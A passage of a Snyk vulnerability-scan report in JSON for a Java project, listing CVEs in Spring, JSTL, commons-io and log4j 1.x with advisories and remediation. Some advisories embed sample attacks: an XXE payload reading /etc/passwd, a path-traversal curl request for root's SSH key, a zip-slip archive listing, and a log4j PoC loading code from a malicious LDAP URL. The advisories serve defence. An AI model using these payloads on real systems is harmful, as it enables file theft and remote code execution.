      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2329097",
      "identifiers": {
        "CVE": [
          "CVE-2021-22096"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-core",
        "groupId": "org.springframework"
      },
      "modificationTime": "2022-01-02T11:14:46.053200Z",
      "moduleName": "org.springframework:spring-core",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-10-27T16:55:13Z",
      "references": [
        {
          "title": "Github Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/346b75580267dc5d8d257be198d5841ce4e1add5"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2021-22096"
        }
      ],
      "semver": {
        "vulnerable": [
          "[5.3.0,5.3.12)",
          "[,5.2.18)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Output Neutralization for Logs",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "org.springframework:spring-core@3.2.13.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework:spring-core@5.2.18.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-core",
      "version": "3.2.13.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2022-01-06T12:31:26.181234Z",
      "credit": [
        "psytester"
      ],
      "cvssScore": 4.3,
      "description": "## Overview\n[org.springframework:spring-core](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22spring-core%22) is a core package within the spring-framework that contains multiple classes and utilities.\n\nAffected versions of this package are vulnerable to Improper Input Validation when a user provides malicious input, causing insertion of additional log entries.\n## Remediation\nUpgrade `org.springframework:spring-core` to version 5.2.19.RELEASE, 5.3.14 or higher.\n## References\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2021-22060)\n",
      "disclosureTime": "2022-01-06T11:18:34Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.2.19.RELEASE",
        "5.3.14"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2330878",
      "identifiers": {
        "CVE": [
          "CVE-2021-22060"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-core",
        "groupId": "org.springframework"
      },
      "modificationTime": "2022-01-06T17:17:24.854427Z",
      "moduleName": "org.springframework:spring-core",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-06T17:17:24.995166Z",
      "references": [
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2021-22060"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.2.19.RELEASE)",
          "[5.3.0,5.3.14)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Input Validation",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "org.springframework:spring-core@3.2.13.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework:spring-core@5.2.19.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-core",
      "version": "3.2.13.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:31.471000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\r\n[`org.springframework:spring-core`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22spring-core%22) provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\r\n\r\nAffected versions of the package are vulnerable to Denial Of Service (DoS) via the `PatternMatchUtils` method, which has an infinite loop bug.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\r\n\r\n## Remediation\r\nUpgrade `org.springframework:spring-core` to versions 3.2.14, 4.1.7, 4.2RC1 or higher. \r\n\r\n## References\r\n- [Jira Issue](https://jira.spring.io/browse/SPR-12971)",
      "disclosureTime": "2015-11-06T05:26:24Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "3.2.14.RELEASE",
        "4.1.7.RELEASE"
      ],
      "functions": [
        {
          "functionId": {
            "className": "PatternMatchUtils",
            "filePath": "org/springframework/util/PatternMatchUtils.java",
            "functionName": "simpleMatch"
          },
          "version": [
            "[3.2.8.RELEASE,3.2.14.RELEASE)",
            "[4.1.0.RELEASE,4.1.7.RELEASE)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.util.PatternMatchUtils",
            "functionName": "simpleMatch"
          },
          "version": [
            "[3.2.8.RELEASE,3.2.14.RELEASE)",
            "[4.1.0.RELEASE,4.1.7.RELEASE)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-31326",
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-400"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-core",
        "groupId": "org.springframework"
      },
      "modificationTime": "2020-04-26T13:01:10.893346Z",
      "moduleName": "org.springframework:spring-core",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2015-11-06T05:26:24Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/db80378dbef4bba302a3f1248f7315ae1ef8f614"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/17563"
        }
      ],
      "semver": {
        "vulnerable": [
          "[3.2.8.RELEASE,3.2.14.RELEASE)",
          "[4.1.0.RELEASE,4.1.7.RELEASE)"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "low",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "org.springframework:spring-core@3.2.13.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework:spring-core@3.2.14.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-core",
      "version": "3.2.13.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:31.438000Z",
      "credit": [
        "Edward"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[`org.springframework:spring-context`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22spring-context%22)\nAffected versions of the package are vulnerable to Denial of Service (DoS). The CronSequenceGenerator constructor goes into infinite loop if one of the fields is of the form n/0.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\n\n## References\n- [Jira Issue](https://jira.spring.io/browse/SPR-12871)\n",
      "disclosureTime": "2015-11-06T05:35:08.561000Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "3.2.14.RELEASE",
        "4.1.7.RELEASE"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-31323",
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-400"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-context",
        "groupId": "org.springframework"
      },
      "modificationTime": "2020-04-06T16:45:12.132013Z",
      "moduleName": "org.springframework:spring-context",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-context",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2015-11-06T05:35:08.561000Z",
      "references": [
        {
          "title": "Jira Issue",
          "url": "https://jira.spring.io/browse/SPR-12871"
        }
      ],
      "semver": {
        "vulnerable": [
          "[3.2.13.RELEASE,3.2.14.RELEASE)",
          "[4.1.6.RELEASE,4.1.7.RELEASE)"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "low",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "org.springframework:spring-context@3.2.13.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework:spring-context@3.2.14.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-context",
      "version": "3.2.13.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:31.886000Z",
      "credit": [
        "David Jorm"
      ],
      "cvssScore": 7.3,
      "description": "## Overview\n[taglibs:standard](https://tomcat.apache.org/download-taglibs.cgi) is an implementation of the JSP Standard Tag Library (JSTL) specification.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. Apache Standard Taglibs before 1.2.3 allows remote attackers to execute arbitrary code or conduct external XML entity (XXE) attacks via a crafted XSLT extension in a `<x:parse>` or `<x:transform>` JSTL XML tag.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `taglibs:standard` to version 1.2.3 or higher.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/CVE-2015-0254)\n",
      "disclosureTime": "2015-02-27T16:13:27Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.2.3"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-TAGLIBS-31357",
      "identifiers": {
        "CVE": [
          "CVE-2015-0254"
        ],
        "CWE": [
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-6x4w-8w53-xrvv"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "standard",
        "groupId": "taglibs"
      },
      "modificationTime": "2020-06-12T14:36:56.185972Z",
      "moduleName": "taglibs:standard",
      "packageManager": "maven",
      "packageName": "taglibs:standard",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2015-02-27T16:51:55Z",
      "references": [
        {
          "title": "Apache Mail Archive",
          "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254"
        },
        {
          "title": "RedHat CVE Database",
          "url": "https://access.redhat.com/security/cve/CVE-2015-0254"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.2.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "XML External Entity (XXE) Injection",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "taglibs:standard@1.1.2"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "taglibs:standard",
      "version": "1.1.2"
    }
  ],
  "ok": false,
  "dependencyCount": 20,
  "org": "oculbeaux",
  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.22.1\nignore: {}\npatch: {}\n",
  "isPrivate": true,
  "licensesPolicy": {
    "severities": {},
    "orgLicenseRules": {
      "AGPL-1.0": {
        "licenseType": "AGPL-1.0",
        "severity": "high",
        "instructions": ""
      },
      "AGPL-3.0": {
        "licenseType": "AGPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "Artistic-1.0": {
        "licenseType": "Artistic-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "Artistic-2.0": {
        "licenseType": "Artistic-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "CDDL-1.0": {
        "licenseType": "CDDL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "CPOL-1.02": {
        "licenseType": "CPOL-1.02",
        "severity": "high",
        "instructions": ""
      },
      "EPL-1.0": {
        "licenseType": "EPL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "GPL-2.0": {
        "licenseType": "GPL-2.0",
        "severity": "high",
        "instructions": ""
      },
      "GPL-3.0": {
        "licenseType": "GPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "LGPL-2.0": {
        "licenseType": "LGPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-2.1": {
        "licenseType": "LGPL-2.1",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-3.0": {
        "licenseType": "LGPL-3.0",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-1.1": {
        "licenseType": "MPL-1.1",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-2.0": {
        "licenseType": "MPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "MS-RL": {
        "licenseType": "MS-RL",
        "severity": "medium",
        "instructions": ""
      },
      "SimPL-2.0": {
        "licenseType": "SimPL-2.0",
        "severity": "high",
        "instructions": ""
      }
    }
  },
  "packageManager": "maven",
  "ignoreSettings": null,
  "summary": "30 vulnerable dependency paths",
  "remediation": {
    "unresolved": [
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F",
        "alternativeIds": [],
        "creationTime": "2021-04-27T10:51:05.462338Z",
        "credit": [
          "Lukas Euler"
        ],
        "cvssScore": 5.3,
        "description": "## Overview\n[commons-io:commons-io](https://search.maven.org/artifact/commons-io/commons-io) is a The Apache Commons IO library contains utility classes, stream implementations, file filters, file comparators, endian transformation classes, and much more.\n\nAffected versions of this package are vulnerable to Directory Traversal via calling the method FileNameUtils.normalize using an improper string like `//../foo` or `\\\\..\\foo`, which may allow access to files in the parent directory.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `commons-io:commons-io` to version 2.7 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d)\n- [Jira Issue](https://issues.apache.org/jira/browse/IO-556)\n- [PoC](https://github.com/AlAIAL90/CVE-2021-29425)\n",
        "disclosureTime": "2021-04-26T16:04:00Z",
        "exploit": "Functional",
        "fixedIn": [
          "2.7"
        ],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-COMMONSIO-1277109",
        "identifiers": {
          "CVE": [
            "CVE-2021-29425"
          ],
          "CWE": [
            "CWE-20",
            "CWE-22"
          ],
          "GHSA": [
            "GHSA-gwrp-pvrq-jmwv"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "commons-io",
          "groupId": "commons-io"
        },
        "modificationTime": "2021-04-27T14:26:12.193344Z",
        "moduleName": "commons-io:commons-io",
        "packageManager": "maven",
        "packageName": "commons-io:commons-io",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2021-04-27T14:26:12Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d"
          },
          {
            "title": "Jira Issue",
            "url": "https://issues.apache.org/jira/browse/IO-556"
          },
          {
            "title": "PoC",
            "url": "https://github.com/AlAIAL90/CVE-2021-29425"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0, 2.7)"
          ]
        },
        "severity": "medium",
        "socialTrendAlert": false,
        "title": "Directory Traversal",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "commons-fileupload:commons-fileupload@1.3",
          "commons-io:commons-io@2.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "commons-io:commons-io",
        "version": "2.2",
        "severityWithCritical": "medium"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
        "alternativeIds": [],
        "creationTime": "2017-02-22T07:28:19.341000Z",
        "credit": [
          "David Jorm"
        ],
        "cvssScore": 7.3,
        "description": "## Overview\n[javax.servlet:jstl](https://mvnrepository.com/artifact/javax.servlet/jstl) is a collection of useful JSP tags which encapsulates the core functionality common to many JSP applications.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. Apache Standard Taglibs before 1.2.3 allows remote attackers to execute arbitrary code or conduct external XML entity (XXE) attacks via a crafted XSLT extension in a `<x:parse>` or `<x:transform>` JSTL XML tag.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nThere is no fixed version for `javax.servlet:jstl`.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/CVE-2015-0254)\n",
        "disclosureTime": "2015-02-27T16:13:27Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-JAVAXSERVLET-30449",
        "identifiers": {
          "CVE": [
            "CVE-2015-0254"
          ],
          "CWE": [
            "CWE-94"
          ],
          "GHSA": [
            "GHSA-6x4w-8w53-xrvv"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "jstl",
          "groupId": "javax.servlet"
        },
        "modificationTime": "2019-04-18T07:20:47.242780Z",
        "moduleName": "javax.servlet:jstl",
        "packageManager": "maven",
        "packageName": "javax.servlet:jstl",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2015-02-27T16:51:55Z",
        "references": [
          {
            "title": "Apache Mail Archive",
            "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E"
          },
          {
            "title": "NVD",
            "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254"
          },
          {
            "title": "RedHat CVE Database",
            "url": "https://access.redhat.com/security/cve/CVE-2015-0254"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "high",
        "socialTrendAlert": false,
        "title": "XML External Entity (XXE) Injection",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "javax.servlet:jstl@1.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "javax.servlet:jstl",
        "version": "1.2",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "alternativeIds": [],
        "creationTime": "2021-06-04T15:38:41.700520Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n",
        "disclosureTime": "2020-04-27T17:16:14Z",
        "exploit": "Not Defined",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-1300176",
        "identifiers": {
          "CVE": [
            "CVE-2020-9488"
          ],
          "CWE": [
            "CWE-297"
          ],
          "GHSA": [
            "GHSA-vwqq-5vrc-xw9h"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2021-06-04T15:38:41.700537Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2020-04-28T17:16:14Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b"
          },
          {
            "title": "Jira Issue",
            "url": "https://issues.apache.org/jira/browse/LOG4J2-2819"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Man-in-the-Middle (MitM)",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "log4j:log4j@1.2.16"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.16",
        "severityWithCritical": "low"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
        "alternativeIds": [],
        "creationTime": "2021-12-13T14:52:40.887231Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 6.6,
        "description": "## Overview\n\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution.\n<br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n\n## Remediation\n\nThere is no fixed version for `log4j:log4j`.\n\n\nlog4j 1.x is End-of-Life, and a fixed version will not be released.\nIf you believe your application meets the conditions mentioned in the advisory, consider upgrading to the latest log4j 2.x version, or block user input from reaching `JMSAppender` configurations.\n\n## References\n\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
        "disclosureTime": "2021-12-10T00:00:00Z",
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "functions": [],
        "functions_new": [],
        "id": "SNYK-JAVA-LOG4J-2316893",
        "identifiers": {
          "CVE": [
            "CVE-2021-4104"
          ],
          "CWE": [
            "CWE-94"
          ]
        },
        "language": "java",
        "malicious": false,
        "mavenModuleName": {
          "artifactId": "log4j",
          "groupId": "log4j"
        },
        "modificationTime": "2021-12-13T15:44:22.774691Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2021-12-13T15:31:00Z",
        "references": [
          {
            "title": "Apache Mail",
            "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx"
          },
          {
            "title": "GitHub Comment",
            "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301"
          },
          {
            "title": "GitHub Discussion",
            "url": "https://github.com/apache/logging-log4j2/pull/608"
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "severity": "medium",
        "socialTrendAlert": true,
        "title": "Arbitrary Code Execution",
        "from": [
          "com.waratek:spiracle@1.4.0",
          "log4j:log4j@1.2.16"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.16",
        "severityWithCritical": "medium"
      },
      {
